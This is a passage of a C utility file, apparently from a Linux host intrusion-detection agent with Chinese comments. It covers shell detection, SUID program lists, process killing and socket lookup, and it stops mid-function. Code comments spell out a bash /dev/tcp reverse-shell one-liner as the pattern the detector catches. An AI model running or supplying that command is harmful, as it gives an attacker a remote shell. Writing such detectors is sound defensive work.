#define _GNU_SOURCE  // getpgid

/* netlink */
#include <sys/socket.h>
#include <linux/netlink.h>

#include <pwd.h>
#include <sys/stat.h>
#include <linux/limits.h>

#include <linux/kdev_t.h>
#include <linux/major.h>

#include <netdb.h>
#include <sys/socket.h>

#include <utmpx.h>
#include <utmp.h>

#include <sys/vfs.h>

#include "header.h"

char *nullstr = "";
char *success_cn = "成功";
char *failed_cn = "失败";

int  last_sec = 0;

int lang = 0;
/* Chinese return 0; Englist 1 */
int get_language(void)
{
        FILE *fp = NULL;
        char buf[256] = {0};

        fp = fopen(LANGFILE, "r");
        if (fp) {
                if (fgets(buf, 256, fp) == NULL) {
                        fclose(fp);
                        return 0;
                }
                fclose(fp);

                if (strcasestr(buf, "English")) {
                        return 1;
                }
        }
        return 0;
}

/* 消除头部的空格符 */
char *skip_headspace(char *str)
{
        char *ptr = str;

        while (isspace(*ptr)) {
                ptr++;
        }
        return ptr;
}
/* 消除尾部的空格符、回车和换行符 */
void delete_tailspace(char *str)
{
        int i = 0, len = strlen(str);

        for (i = len-1; i >= 0; i--) {
                if (!isspace(str[i])) {
                        return;
                }
                str[i] = 0;
        }
}

/*
 * 用于消除编译警告
 * 把path拼入post消息时，由于path和post的最大长度都是4096，故警告path加上其他字符
 * 可能会超过post的最大长度，把path最后拼入post，并用thestring(path)忽略此警告
 */
char *thestring(char *str)
{
	return str;
}

void get_random_uuid(char *uuid)
{
	FILE *fp = NULL;

	if (uuid == NULL) {
		return;
	}

	fp = sniper_fopen("/proc/sys/kernel/random/uuid", "r", INFO_GET);
	if (!fp) {
		return;
	}

	fgets(uuid, S_UUIDLEN-1, fp);
	delete_tailspace(uuid);
	sniper_fclose(fp, INFO_GET);
}

char *translate_result_into_chinese(char *result)
{
	if (!result) {
		return nullstr;
	}

	if (strcmp(result, "Success") == 0 || strcmp(result, "success") == 0) {
		return success_cn;
	}
	if (strcmp(result, "Failed") == 0 ||strcmp(result, "failed") == 0){
		return failed_cn;
	}
	return result;
}

/*
 * 检查客户端程序是否已经在运行，防止重复运行客户端程序
 * 返回0，没有客户端程序在运行
 * 返回1，有客户端程序在运行
 * 返回-1，视为没有客户端程序在运行，但有错误发生
 */
int is_this_running(char *name, char *pidfile, int *pid_fd, char *version_file)
{
	char buf[32] = {0};
	int ver_fd = -1;
	int len = 0;
	struct flock fl = {0};

	fl.l_type = F_WRLCK;
	fl.l_whence = SEEK_SET;
	fl.l_start = 0;
	fl.l_len = 0;

	if (!name || !pidfile || !pid_fd) {
		return -1;
	}

	*pid_fd = open(pidfile, O_RDWR|O_CREAT, 0644);
	if (*pid_fd < 0) {
		fprintf(stderr, "Open %s fail: %s\n", pidfile, strerror(errno));
		MON_ERROR("Open %s fail: %s\n", pidfile, strerror(errno));
		return -1;
	}
	fchmod(*pid_fd, 0644); //防止umask屏蔽掉0044

	if (fcntl(*pid_fd, F_SETLK, &fl) < 0) {
		/* lock file failed means another is running */
		INFO("%s already running\n", name);
		close(*pid_fd);
		return 1;
	}

	len = snprintf(buf, 32, "%d", getpid());
	if (len < 0 ) {
		fprintf(stderr, "get pid fail: %s\n", strerror(errno));
		MON_ERROR("get pid fail: %s\n", strerror(errno));
		close(*pid_fd);
		return -1;
	}

	if (write(*pid_fd, buf, len+1) < 0) {
		fprintf(stderr, "Wrtie %s fail: %s\n", pidfile, strerror(errno));
		MON_ERROR("Wrtie %s fail: %s\n", pidfile, strerror(errno));
		close(*pid_fd);
		return -1;
	}

	if (!version_file) {
		return 0;
	}

	/* Record running version */
	ver_fd = open(version_file, O_RDWR|O_CREAT|O_TRUNC, 0644);
	if (ver_fd < 0) {
		fprintf(stderr, "Open %s fail: %s\n", version_file, strerror(errno));
		MON_ERROR("Open %s fail: %s\n", version_file, strerror(errno));
		return 0;
	}
	fchmod(ver_fd, 0644); //防止umask屏蔽掉0044

	len = snprintf(buf, 32, "Release %s\n", SNIPER_VERSION);
	if (write(ver_fd, buf, len) < 0) {
		fprintf(stderr, "Wrtie %s fail: %s\n", version_file, strerror(errno));
		MON_ERROR("Wrtie %s fail: %s\n", version_file, strerror(errno));
	}
	close(ver_fd);

	return 0;
}

void save_sniper_status(char *info)
{
        FILE *fp = NULL;

        if (!info) {
                return;
        }

        fp = fopen(STATUSFILE, "a");
        if (!fp) {
                MON_ERROR("fopen %s fail: %s\n",
                        STATUSFILE, strerror(errno));
                return;
        }

        fprintf(fp, "%s", info);
	fflush(fp);
        fclose(fp);
}

pid_t mygetpgid(pid_t pid)
{
	pid_t pgid = 0;

	if (pid <= 0) {
		MON_ERROR("getpgid(%d) invalid\n", pid);
		return -1;
	}

	pgid = getpgid(pid);
	if (pgid <= 0 && errno != ESRCH) {
		MON_ERROR("getpgid(%d) error %d : %s\n",
			  pid, pgid, strerror(errno));
	}

	return pgid;
}
int mykill(pid_t pid, int sig)
{
	int ret = 0;

	if (pid <= 0) { //非法进程号
		INFO("kill(%d, %d) invalid. skip\n", pid, sig);
		return -1;
	}
	if (pid < 300 && sig != 0) { //进程号300以下是保留进程号，留给系统进程和守护进程用的
		INFO("kill(%d, %d) invalid. skip\n", pid, sig);
		return -1;
	}

	ret = kill(pid, sig);
	if (sig) {
		if (ret < 0 && errno != ESRCH) {
			MON_ERROR("kill(%d, %d) error %d : %s\n",
				  pid, sig, ret, strerror(errno));
		} else {
			INFO("process %d stopped\n", pid);
		}
	}

	return ret;
}
int mykillpg(int pgrp, int sig)
{
	int ret = 0;

	if (pgrp <= 0) { //非法进程号
		INFO("kill(%d, %d) invalid. skip\n", pgrp, sig);
		return -1;
	}
	if (pgrp < 300 && sig != 0) { //进程号300以下是保留进程号，留给系统进程和守护进程用的
		INFO("killpg(%d, %d) invalid. skip\n", pgrp, sig);
		return -1;
	}
	ret = killpg(pgrp, sig);
	if (ret < 0 && errno != ESRCH) {
		MON_ERROR("killpg(%d, %d) error %d : %s\n",
			  pgrp, sig, ret, strerror(errno));
	} else {
		INFO("process group %d stopped\n", pgrp);
	}

	return ret;
}

void mysleep(int secs)
{
	int i = 0;

	while (Online && i < secs) {
		sleep(1);
		i++;
	}
}

/* 进程创建时间(从系统启动开始计时)，转化成真实时间 */
time_t procrealtime(time_t sec)
{
	return sec + uptime_sec;
}
/* 进程创建时间(从系统启动开始计时)，转化成真实时间，并与管控中心时间同步 */
time_t proc2servtime(time_t sec)
{
	return sec + uptime_sec + serv_timeoff;
}

/* 许可的su程序 */
#define SUPROGNUM 6
char suprog[SUPROGNUM][32] = {
"/bin/su",
"/usr/bin/su",
"/bin/sudo",
"/usr/bin/sudo",
"/usr/bin/ksu",
"/usr/kerberos/bin/ksu"
};

/* shell程序，用于判断是否执行了一个shell */
#define SHELLNUM 6
char shellcmds[SHELLNUM][16] = {
"bash",
"sh",
"csh",
"ksh",
"tcsh",
"dash"
};

/* suid programs from centos5.0-7.2 */
#define SUID_MAX 73
#define SUID_SKIP 4
char suid_program[SUID_MAX][64] = {
"/lib64/dbus-1/dbus-daemon-launch-helper",
"/usr/lib64/dbus-1/dbus-daemon-launch-helper",
"/usr/libexec/polkit-1/polkit-agent-helper-1",
"/usr/lib/polkit-1/polkit-agent-helper-1",
"/bin/cgexec",
"/bin/fusermount",
"/bin/mount",
"/bin/ping",
"/bin/ping6",
"/bin/su",
"/bin/umount",
"/sbin/mount.ecryptfs_private",
"/sbin/mount.nfs",
"/sbin/mount.nfs4",
"/sbin/netreport",
"/sbin/pam_timestamp_check",
"/sbin/umount.nfs",
"/sbin/umount.nfs4",
"/sbin/unix_chkpwd",
"/usr/bin/at",
"/usr/bin/chage",
"/usr/bin/chfn",
"/usr/bin/chsh",
"/usr/bin/crontab",
"/usr/bin/fusermount",
"/usr/bin/gpasswd",
"/usr/bin/kgrantpty",
"/usr/bin/kpac_dhcp_helper",
"/usr/bin/ksu",
"/usr/bin/mount",
"/usr/bin/newgrp",
"/usr/bin/passwd",
"/usr/bin/pkexec",
"/usr/bin/rcp",
"/usr/bin/rlogin",
"/usr/bin/rsh",
"/usr/bin/staprun",
"/usr/bin/su",
"/usr/bin/sudo",
"/usr/bin/sudoedit",
"/usr/bin/umount",
"/usr/bin/Xorg",
"/usr/bin/dbus-daemon",
"/usr/sbin/abrt-dbus",
"/usr/kerberos/bin/ksu",
"/usr/lib64/nspluginwrapper/plugin-config",
"/usr/lib64/squid/ncsa_auth",
"/usr/lib64/squid/pam_auth",
"/usr/libexec/openssh/ssh-keysign",
"/usr/libexec/pt_chown",
"/usr/libexec/pulse/proximity-helper",
"/usr/libexec/qemu-bridge-helper",
"/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper",
"/usr/libexec/sssd/krb5_child",
"/usr/libexec/sssd/ldap_child",
"/usr/libexec/sssd/p11_child",
"/usr/libexec/sssd/proxy_child",
"/usr/libexec/sssd/selinux_child",
"/usr/lib/news/bin/inndstart",
"/usr/lib/news/bin/startinnfeed",
"/usr/lib/nspluginwrapper/plugin-config",
"/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper",
"/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper",
"/usr/sbin/ccreds_validate",
"/usr/sbin/mount.nfs",
"/usr/sbin/netreport",
"/usr/sbin/pam_timestamp_check",
"/usr/sbin/seunshare",
"/usr/sbin/suexec",
"/usr/sbin/unix_chkpwd",
"/usr/sbin/userhelper",
"/usr/sbin/userisdnctl",
"/usr/sbin/usernetctl"
};

int is_su_sudo(char *cmd)
{
	int i = 0;

	for (i = 0; i < SUPROGNUM; i++) {
		if (strcmp(cmd, suprog[i]) == 0) {
			return 1;
		}
	}

	return 0;
}

/* 0：不在预设集合里。1：在集合里。2：在集合里，因较常用，忽略之 */
int in_suid_set(char *cmd)
{
	int i;

	for (i = 0; i < SUID_MAX; i++) {
		if (strcmp(cmd, suid_program[i]) == 0) {
			if (i < SUID_SKIP) {
				return 2;
			}
			return 1;
		}
	}

	return 0;
}

int is_skip_suid(taskstat_t *taskstat)
{
	int i = 0;

	for (i = 0; i < SUID_SKIP; i++) {
		if (strcmp(taskstat->cmd, suid_program[i]) == 0) {
			return 1;
		}
	}

	return 0;
}

static int is_tclsh(char *cmdname)
{
	int i = 5;

	if (!cmdname || strncmp(cmdname, "tclsh", 5) != 0) {
		return 0;
	}

	while (cmdname[i]) {
		if (cmdname[i] == '-' || cmdname[i] == '.' || isdigit(cmdname[i])) {
			i++;
			continue;
		}
		return 0;
	}
	return 1;
}

/*
 * shell程序进程状态是sleeping，且没有子进程退出信号待处理，或当前指令不是do_wait，说明这是一个交互shell
 * bash -c 或 sh -c会有子进程退出信号，等待被执行的命令结束
 * bash 或 sh如果是等待输入命令的状态，有信号待处理，如果正执行命令中，无信号
 * 用来识别下面的命令产生的shell
 * /bin/bash -c "exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"
 *
 * sh -c "hehe;sleep 600"这种形式的命令，父进程没有子进程退出信号待处理，需要检查当前指令是否do_wait
 * 考虑到兼容性（各CPU平台的系统调用号有不同），没有用/proc/PID/syscall来检查是否在等子进程结束
 */
int is_bash_waiting_cmd(char *cmd, pid_t pid)
{
	int i = 0, shellcmd = 0;
	FILE *fp = NULL;
	char state[8] = {0};
	char line[S_LINELEN] = {0};
	char path[S_PROCPATHLEN] = {0};
	char *cmdname = safebasename(cmd);
	unsigned long sig = 0;

//ZX20211124 有bash -c "xxx"或sh -c "xxx"的误报，故先放弃这种检测方法
return 0;

	for (i = 0; i < SHELLNUM; i++) {
		if (strcmp(cmdname, shellcmds[i]) == 0) {
			shellcmd = 1;
			break;
		}
	}

	if (!shellcmd) {
		shellcmd = is_tclsh(cmdname);
	}
	if (!shellcmd) {
		return 0;
	}

	snprintf(path, S_PROCPATHLEN, "/proc/%d/status", pid);
	fp = sniper_fopen(path, "r", PROCESS_GET);
	if (!fp) { //打开文件失败视为进程已结束
		return 0;
	}
	while (fgets(line, S_LINELEN, fp) != NULL) {
		if (strncmp(line, "State:", 6) == 0) {
			sscanf(line, "State: %c\n", state);
			if (state[0] != 'S') { //进程状态不是sleeping，肯定不是在等待输入命令
				sniper_fclose(fp, PROCESS_GET);
				return 0;
			}
		}
		if (strncmp(line, "SigBlk:", 7) == 0) {
			sscanf(line, "SigBlk: %lx\n", &sig);
			if (sig & (1 << (SIGCHLD-1))) { //捕捉子进程退出信号，说明执行了命令
				sniper_fclose(fp, PROCESS_GET);
				return 0;
			}
			break;
		}
	}
	sniper_fclose(fp, PROCESS_GET);

	snprintf(path, S_PROCPATHLEN, "/proc/%d/stack", pid);
	fp = sniper_fopen(path, "r", PROCESS_GET);
	if (fp) { //centos5没有stack
		if (fgets(line, S_LINELEN, fp) == NULL) { //读文件失败视为进程已结束
			sniper_fclose(fp, PROCESS_GET);
			return 0;
		}

		sniper_fclose(fp, PROCESS_GET);
		if (strstr(line, "do_wait")) { //在等待子进程结束
			return 0;
		}
	}

	snprintf(path, S_PROCPATHLEN, "/proc/%d/wchan", pid);
	fp = sniper_fopen(path, "r", PROCESS_GET);
	if (!fp) { //打开文件失败视为进程已结束
		return 0;
	}
	if (fgets(line, S_LINELEN, fp) == NULL) { //读文件失败视为进程已结束
		sniper_fclose(fp, PROCESS_GET);
		return 0;
	}
	sniper_fclose(fp, PROCESS_GET);
	if (strstr(line, "do_wait")) { //在等待子进程结束
		return 0;
	}

	return 1;
}

//ZX20211124 对/bin/bash -c "exec 5<>/dev/tcp/192.167.7.200/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"的临时检测方法
static int special_shell(char *cmdline)
{
	char *ptr = NULL, *args = cmdline;

	if (args) {
		ptr = strstr(args, "exec");
		if (ptr) {
			args = ptr;
			ptr = strstr(args, "cat");
			if (ptr) {
				args = ptr;
				ptr = strstr(args, "|");
				if (ptr) {
					args = ptr;
					ptr = strstr(args, "while");
					if (ptr) {
						args = ptr;
						ptr = strstr(args, "read");
						if (ptr) {
							return 1;
						}
					}
				}
			}
		}
	}
	return 0;
}

/* 
 * 起纯shell:
 *   "/bin/bash"
 *   "/bin/bash -i"
 *   "/bin/bash -s"
 *   "/bin/bash -ex"
 *   "/bin/bash      "
 *   "/bin/bash  -"
 *   "/bin/bash   -  "
 *   "/bin/bash  --"
 *   "/bin/bash   --  "
 *   "/bin/bash -i "
 *   "/bin/bash -is"
 *   "/bin/bash -ri"
 *   "/bin/bash -s "
 *   "/bin/bash -si"
 *   "/bin/bash -s --rcfile xx"
 *   "/bin/bash --rcfile -s"
 *   "/bin/bash --rcfile xx -s"
 *   "/bin/bash --rcfile -e"
 *   "/bin/bash --init-file -e"
 *
 * 不是起纯shell:
 *   "/bin/bashx"
 *   "/bin/bash -c hehe"
 *   "/bin/bash -ex hehe"
 *   "/bin/bash -s --rcfile"       //此命令会报错
 *   "/bin/bash -s --rcfile  "     //此命令会报错
 *   "/bin/bash -e --init-file"    //此命令会报错
 *
 * 返回值：-1，不是shell；0，是shell执行个命令；1，是个交互shell
 */
int is_shell(char *execargs)
{
	int i = 0, smode = 0, execfile = 0, fileopt = 0, shellcmd = 0;
	char *ptr = NULL, *cmd = NULL, path[PATH_MAX] = {0};

	if (!execargs) {
		MON_ERROR("is_shell fail, NULL execargs\n");
		return -1;
	}

	/* 在sniper启动前已经存在的bash */
	if (strcmp(execargs, "-bash") == 0) {
		return 1;
	}

	/* 从命令行参数中获取执行命令的路径 */
	snprintf(path, sizeof(path), "%s", execargs);
	ptr = strchr(path, ' ');
	if (ptr) {
		*ptr = 0;
	}

	cmd = safebasename(path);
	if (!cmd) {
		MON_ERROR("is_shell: safebasename(%s) is NULL\n", path);
		return -1;
	}

	for (i = 0; i < SHELLNUM; i++) {
		if (strcmp(cmd, shellcmds[i]) == 0) {
			shellcmd = 1;
			break;
		}
	}
	if (!shellcmd) {
		shellcmd = is_tclsh(cmd);
	}
	if (!shellcmd) {
		return -1;
	}

	if (!ptr) {
		/* 这是不带参数的shell，如/bin/bash */
		return 1;
	}

	/* 下面检查命令行的参数 */
	ptr = strchr(execargs, ' ');

	/* -c执行命令 */
	if (strstr(ptr, " -c ")) {
//ZX20211124 对/bin/bash -c "exec 5<>/dev/tcp/192.167.7.200/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"的临时检测方法
		return special_shell(ptr);
		//return 0;
	}

	/* shell -i 或 shell -s */
	if (strcmp(ptr, " -i") == 0 ||
	    strcmp(ptr, " -s") == 0) {
		return 1;
	}

	/* 完备的参数解析 */
	while (*ptr != 0) {
		/* 压缩多余的空格 */
		while (*ptr == ' ') {
			ptr++;
		}
		/* 参数结束了 */
		if (*ptr == 0) {
			break;
		}

		/* 选项结束了，且有要执行的命令 */
		if (*ptr != '-') {
			execfile = 1;
			break;
		}

		/* 下面是对-的处理 */
		ptr++;

		/* 参数结束了 */
		if (*ptr == 0) {
			break;
		}

		/* 选项结束了 */
		if (*ptr == ' ') {
			/* 压缩多余的空格 */
			while (*ptr == ' ') {
				ptr++;
			}
			/* 参数结束了 */
			if (*ptr == 0) {
				break;
			}
			execfile = 1;
			break;
		}

		/* -- */
		if (*ptr == '-') {
			ptr++;

			/* 参数结束了 */
			if (*ptr == 0) {
				break;
			}

			if (*ptr == ' ') {
				/* 压缩多余的空格 */
				while (*ptr == ' ') {
					ptr++;
				}
				/* 参数结束了 */
				if (*ptr == 0) {
					break;
				}
				execfile = 1;
				break;
			}

			fileopt = 0;
			if (strncmp(ptr, "init-file", 9) == 0) {
				fileopt = 9;
			} else if (strncmp(ptr, "rcfile", 6) == 0) {
				fileopt = 6;
			}
			if (fileopt) {
				ptr += fileopt;

				/* 没有参数，这是错误的命令 */
				if (*ptr == 0) {
					return 0;
				}

				if (*ptr == ' ') {
					/* 压缩多余的空格 */
					while (*ptr == ' ') {
						ptr++;
					}
					/* 没有参数，这是错误的命令 */
					if (*ptr == 0) {
						return 0;
					}

					/* 跳过init-file或rcfile的值 */
					while (*ptr != ' ' && *ptr != 0) {
						ptr++;
					}
					continue;
				}
				/* 这是init-fileX或rcfileX */
				ptr -= fileopt;
			}

			while (*ptr != ' ' && *ptr != 0) {
				ptr++;
			}
			if (*ptr == 0) {
				break;
			}
			/* 下一个参数 */
			continue;
		}

		while (*ptr != ' ' && *ptr != 0) {
			if (*ptr == 'c') {
				return 0;
			}
			if (*ptr == 's') {
				smode = 1;
			}
			ptr++;
		}

		if (*ptr == 0) {
			break;
		}
	}

	if (smode) {
		return 1;
	}

	if (!execfile) {
		return 1;
	}

	return 0;
}

/* 需要测试是否适应LDAP */
void uidtoname(uid_t uid, char *name)
{
	struct passwd pwd = {0};
	struct passwd *result = NULL;
	char *buf = NULL;
	long bufsize = 0;
	int ret = 0;

	if (!name) {
		return;
	}

	if (uid == 0) {
		snprintf(name, S_NAMELEN, "root"); //TODO 改用name_len
		return;
	}

	bufsize = sysconf(_SC_GETPW_R_SIZE_MAX);
	if (bufsize <= 0 || bufsize > 16384) {
		bufsize = 16384;        
	}

	buf = malloc(bufsize);
	if (buf == NULL) {
		MON_ERROR("uidtoname malloc fail\n");
		snprintf(name, S_NAMELEN, "uid(%d)", uid);
		return;
	}

	/* On success, getpwuid_r() return zero, and set *result to pwd.
	   If no match, return 0, and store NULL in *result.
	   In case of error, return errno, and NULL is stored in *result. */
	ret = getpwuid_r(uid, &pwd, buf, bufsize, &result);
	if (result) {
		snprintf(name, S_NAMELEN, "%s", pwd.pw_name);
	} else {
		snprintf(name, S_NAMELEN, "uid(%d)", uid);
		if (ret) {
			MON_ERROR("uid %d to name error: %s(%d/%d)\n",
				uid, strerror(ret), ret, errno);
		}
	}

	free(buf);
}

int nametouid(uid_t *uid, char *name)
{
	struct passwd pwd = {0};
	struct passwd *result = NULL;
	char *buf = NULL;
	long bufsize = 0;
	int ret = 0;

	if (name == NULL || name[0] == 0) {
		return -1;
	}

	bufsize = sysconf(_SC_GETPW_R_SIZE_MAX);
	if (bufsize <= 0 || bufsize > 16384) {
		bufsize = 16384;        
	}

	buf = malloc(bufsize);
	if (buf == NULL) {
		MON_ERROR("nametouid malloc fail\n");
		return -1;
	}

	/* On success, getpwnam_r() return zero, and set *result to pwd.
	   If no match, return 0, and store NULL in *result.
	   In case of error, return errno, and NULL is stored in *result. */
	ret = getpwnam_r(name, &pwd, buf, bufsize, &result);
	if (result) {
		*uid = pwd.pw_uid;
		free(buf);
		return 0;
	}

	if (ret) {
		MON_ERROR("name %s to uid %d error: %s(%d/%d)\n",
			name, uid, strerror(ret), ret, errno);
	} else {
		MON_ERROR("name %s no uid\n", name);
	}

	free(buf);
	return -1;
}

char *safebasename(char *path)
{
        char *baseptr = NULL;

        if (path == NULL) {
                return nullstr;
        }

	/* 不是以/或.开头的，basename即path，如events/0核心线程 */
	if (path[0] != '/' && path[0] != '.') {
		return path;
	}

        baseptr = strrchr(path, '/');
        if (baseptr) {
                return baseptr+1;
        }

        return path;
}

void safedirname(char *path, char *dirname, int dirlen)
{
	char *ptr = NULL;

	if (path == NULL) {
		 return;
	}

	snprintf(dirname, dirlen, "%s", path);
	ptr = strrchr(dirname, '/');
	if (ptr) {
		if (ptr != dirname) {
			*ptr = 0;      // /a/b -> /a
		} else {
			*(ptr+1) = 0;  // /a -> /
		}
	}
}

/*查找某个字符在字符串中第n次出现的位置,无效输入均返回-1*/
int find_symbol_positon(char *str, char c, int n)
{
        char *p = NULL;
        int index = 0;
        int count = 0;

        if(str == NULL || n > strlen(str)) {
                return -1;
        }

        p = str;
        while(*p != '\0')
        {
                if(*p == c)
                {
                        count ++;
                }
                if(count < n)
                {
                        p++;
                        index++;
                }else {
                        break;
                }

        }

        if(count == 0 || str[index] != c) {
                return -1;
        }

        return index;
}

char *get_ip_from_hostname(char *ip, char *hostname)
{
	struct sockaddr_in sa = {0};
	struct hostent *hostent = NULL;

	if (!ip || !hostname) {
		return NULL;
	}

	/* inet_pton() returns 1 on success,
	                       0 if host not a valid network address,
	                      -1 if not a valid address family */
	sa.sin_family = AF_INET;
	if (inet_pton(AF_INET, hostname, &sa.sin_addr) == 0) {
		hostent = gethostbyname(hostname);
		if (!hostent) {
			return hostname;
		}
		memcpy(&sa.sin_addr, hostent->h_addr, sizeof(struct in_addr));
	}
	inet_ntop(AF_INET, &sa.sin_addr, ip, S_IPLEN);
	return ip;
}

char socket_state[SOCKSTATS][16] = {
        "UNKNOWN",
        "ESTABLISHED",
        "SYN_SENT",
        "SYN_RECV",
        "FIN_WAIT1",
        "FIN_WAIT2",
        "TIME_WAIT",
        "CLOSE",
        "CLOSE_WAIT",
        "LAST_ACK",
        "LISTEN",
        "CLOSING"
};
/* 从/proc/net/[tcp/tcp6/udp/udp6]的某一行里取socket信息 */
int get_socket_info(char *line, sockinfo_t *info)
{
	int num = 0, slot = 0;
	char src_addr[64] = {0}, dst_addr[64] = {0}, more[128] = {0};
	struct in6_addr in6 = {{{0}}};
	unsigned long addr = 0;
	char ip6[S_IPLEN] = {0};

	num = sscanf(line,
		"%d: %63[0-9A-Fa-f]:%X %63[0-9A-Fa-f]:%X "
		"%X %*s %*s %*s %d %*s %lu %127s",
		&slot, src_addr, &info->src_port, dst_addr, &info->dst_port,
		&info->state, &info->uid, &info->inode, more);
	if (num != 9) {
		return -1;
	}

	if (info->state < 0 || info->state >= SOCKSTATS) {
		info->state = 0;
	}

	if (strlen(src_addr) > 8) { // tcp6/udp6
		sscanf(src_addr, "%08X%08X%08X%08X",
			&in6.s6_addr32[0], &in6.s6_addr32[1],
			&in6.s6_addr32[2], &in6.s6_addr32[3]);
		inet_ntop(AF_INET6, &in6, ip6, S_IPLEN);
		if (strncmp(ip6, "::ffff:", 7) == 0) {
			snprintf(info->src_ip, sizeof(info->src_ip), "%s", ip6 + 7);
		} else {
			snprintf(info->src_ip, sizeof(info->src_ip), "%s", ip6);
		}

		sscanf(dst_addr, "%08X%08X%08X%08X",
			&in6.s6_addr32[0], &in6.s6_addr32[1],
			&in6.s6_addr32[2], &in6.s6_addr32[3]);
		inet_ntop(AF_INET6, &in6, ip6, S_IPLEN);
		if (strncmp(ip6, "::ffff:", 7) == 0) {
			snprintf(info->dst_ip, sizeof(info->dst_ip), "%s", ip6 + 7);
		} else {
			snprintf(info->dst_ip, sizeof(info->dst_ip), "%s", ip6);
		}
	} else {
		addr = strtoul(src_addr, NULL, 16);
		inet_ntop(AF_INET, &addr, info->src_ip, S_IPLEN);

		addr = strtoul(dst_addr, NULL, 16);
		inet_ntop(AF_INET, &addr, info->dst_ip, S_IPLEN);
	}

	if (strcmp(info->src_ip, "::") == 0) {
		snprintf(info->src_ip, sizeof(info->src_ip), "0.0.0.0");
	} else if (strcmp(info->src_ip, "::1") == 0) {
		snprintf(info->src_ip, sizeof(info->src_ip), "127.0.0.1");
	}

	if (strcmp(info->dst_ip, "::") == 0) {
		snprintf(info->dst_ip, sizeof(info->dst_ip), "0.0.0.0");
	} else if (strcmp(info->dst_ip, "::1") == 0) {
		snprintf(info->dst_ip, sizeof(info->dst_ip), "127.0.0.1");
	}

	return 1;
}

static int search_socket_info(char *path, sockinfo_t *info, ino_t inode)
{
	FILE *fp = NULL;
	char line[S_LINELEN] = {0};

	if (!path || !info || inode == 0) {
		return -1;
	}

	fp = sniper_fopen(path, "r", INFO_GET);
	if (!fp) {
		return -1;
	}

	fgets(line, S_LINELEN, fp);
	while (fgets(line, S_LINELEN, fp)) {
		if (get_socket_info(line, info) >= 0 && info->inode == inode) {
			sniper_fclose(fp, INFO_GET);
			return 0;
		}
	}
	sniper_fclose(fp, INFO_GET);
	return -1;
}

/* 取pid进程的网络连接信息，取第一个ESTABLISHED的socket信息 */
int get_process_socket_info(pid_t pid, sockinfo_t *info, int check_udp)
{
	char path[S_PROCPATHLEN] = {0};
	char fdpath[S_PROCPATHLEN] = {0};
	DIR *dirp = NULL;
	struct dirent *fdent = NULL;
	struct stat st = {0};

	snprintf(path, S_PROCPATHLEN, "/proc/%d/fd", pid);
	dirp = sniper_opendir(path, INFO_GET);
        if (dirp == NULL) {
                if (errno != ENOENT) {
                	MON_ERROR("open dir %s fail : %s\n", path, strerror(errno));
		}
                return -1;
        }

	while ((fdent = readdir(dirp)) != NULL) {
		snprintf(fdpath, S_PROCPATHLEN, "/proc/%d/fd/%s", pid, fdent->d_name);
		if (stat(fdpath, &st) < 0) {
                	if (errno != ENOENT) {
	                	MON_ERROR("stat %s fail : %s\n", fdpath, strerror(errno));
			}
			continue;
		}
		if (!S_ISSOCK(st.st_mode)) {
			continue;
		}

		/* 查找socket对应的连接 */
		if (search_socket_info("/proc/net/tcp", info, st.st_ino) == 0 ||
		    search_socket_info("/proc/net/tcp6", info, st.st_ino) == 0) {
			if (info->dst_port != 0) { //对方端口不为0，说明这是一个连接，不是listen
				sniper_closedir(dirp, INFO_GET);
				return 0;
			}
		}

		if (!check_udp) {
			continue;
		}
		if (search_socket_info("/proc/net/udp", info, st.st_ino) == 0 ||
		    search_socket_info("/proc/net/udp6", info, st.st_ino) == 0) {
			/* 对方端口不为0，说明这是一个连接，不是listen。下面是一个udp的例子
			   udp  0  0  192.167.7.111:60982   10.0.0.1:8080   ESTABLISHED 13566/bash */
			if (info->dst_port != 0) {
				sniper_closedir(dirp, INFO_GET);
				return 0;
			}
		}
	}

	sniper_closedir(dirp, INFO_GET);
	return -1;
}

/* 取pid进程的网络连接信息，取第一个ESTABLISHED的本地端口非port的socket信息 */
int get_connout_socket_info(pid_t pid, sockinfo_t *info, int port)
{
	char path[S_PROCPATHLEN] = {0};
	char fdpath[S_PROCPATHLEN] = {0};
	DIR *dirp = NULL;
	struct dirent *fdent = NULL;
	struct stat st = {0};

	snprintf(path, S_PROCPATHLEN, "/proc/%d/fd", pid);
	dirp = sniper_opendir(path, INFO_GET);
        if (dirp == NULL) {
                if (errno != ENOENT) {
                	MON_ERROR("open dir %s fail : %s\n", path, strerror(errno));
		}
                return -1;
        }

	while ((fdent = readdir(dirp)) != NULL) {
		snprintf(fdpath, S_PROCPATHLEN, "/proc/%d/fd/%s", pid, fdent->d_name);
		if (stat(fdpath, &st) < 0) {
                	if (errno != ENOENT) {
	                	MON_ERROR("stat %s fail : %s\n", fdpath, strerror(errno));
			}
			continue;
		}
		if (!S_ISSOCK(st.st_mode)) {
			continue;
		}

		/* 查找socket对应的连接 */
		if (search_socket_info("/proc/net/tcp", info, st.st_ino) == 0 ||
		    search_socket_info("/proc/net/tcp6", info, st.st_ino) == 0) {
			if (info->dst_port != 0 && info->src_port != port) { //对方端口不为0，说明这是一个连接，不是listen
				sniper_closedir(dirp, INFO_GET);
				return 0;
			}
		}
	}

	sniper_closedir(dirp, INFO_GET);
	return -1;
}

int process_alive(pid_t pid)
{
	printf("process_alive pid=%d\n",pid);
	if (mykill(pid, 0) < 0) {
		return 0;
	}

	return 1;
}

int check_shell_tty(pid_t pid)
{
	int major = 0;
	char path[S_PROCPATHLEN] = {0};
	struct stat st0 = {0};
	struct stat st1 = {0};

	snprintf(path, S_PROCPATHLEN, "/proc/%d/fd", pid);
	if (access(path, F_OK) < 0) {
		/* 进程已退出，那么就认为有tty，是正常的吧 */
		return TRUE;
	}

	snprintf(path, S_PROCPATHLEN, "/proc/%d/fd/0", pid);
	if (stat(path, &st0) < 0) {
		/* 取输入设备失败 */
		return FALSE;
	}
	if (!S_ISCHR(st0.st_mode)) {
		/* 输入设备不是字符设备 */
		return FALSE;
	}
	major = MAJOR(st0.st_rdev);
	if (major != TTY_MAJOR &&
	    (major < UNIX98_PTY_SLAVE_MAJOR ||
	     major >= UNIX98_PTY_SLAVE_MAJOR + UNIX98_PTY_SLAVE_MAJOR)) {
		/* 输入设备不是终端设备 */
		return FALSE;
	}

	snprintf(path, S_PROCPATHLEN, "/proc/%d/fd/0", pid);
	if (stat(path, &st1) < 0) {
		/* 取输出设备失败 */
